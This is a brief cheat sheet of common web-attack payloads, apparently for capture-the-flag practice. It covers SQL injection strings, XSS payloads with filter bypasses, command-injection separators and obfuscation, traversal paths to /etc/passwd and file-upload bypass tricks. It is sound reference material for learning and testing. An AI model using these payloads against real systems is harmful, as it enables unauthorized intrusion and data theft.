# Common Web Vulnerabilities Quick Reference

## SQL Injection

### Detection
```sql
-- Test parameters with:
'
"
1'
1"
1' OR '1'='1
1" OR "1"="1
```

### Exploitation
```sql
-- Union-based
' UNION SELECT 1,2,3--
' UNION SELECT version(),user(),database()--

-- Boolean-based
' AND 1=1--  (True)
' AND 1=2--  (False)

-- Time-based
'; WAITFOR DELAY '00:00:05'--
' AND SLEEP(5)--
```

## Cross-Site Scripting (XSS)

### Payloads
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Bypass filters -->
<script>alert(String.fromCharCode(88,83,83))</script>
javascript:alert(1)
<img src="javascript:alert(1)">
```

## Command Injection

### Common separators
```bash
; ls
& ls
| ls
&& ls
|| ls
`ls`
$(ls)
```

### Bypass filters
```bash
# Quotes
l's'  # becomes ls
"l"s  # becomes ls

# Wildcards
/bin/c?t /etc/passwd
/bin/cat /etc/pass*

# Encoding
$(echo bHM= | base64 -d)  # decodes to "ls"
```

## Directory Traversal

### Common payloads
```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## File Upload Vulnerabilities

### Bypass techniques
```
# Extension bypass
file.php.jpg
file.jpg.php
file.php%00.jpg

# Content-Type bypass
Change Content-Type to image/jpeg

# Magic bytes
Add GIF89a; at beginning of PHP file
```

---
*Web security quick reference for CTF challenges*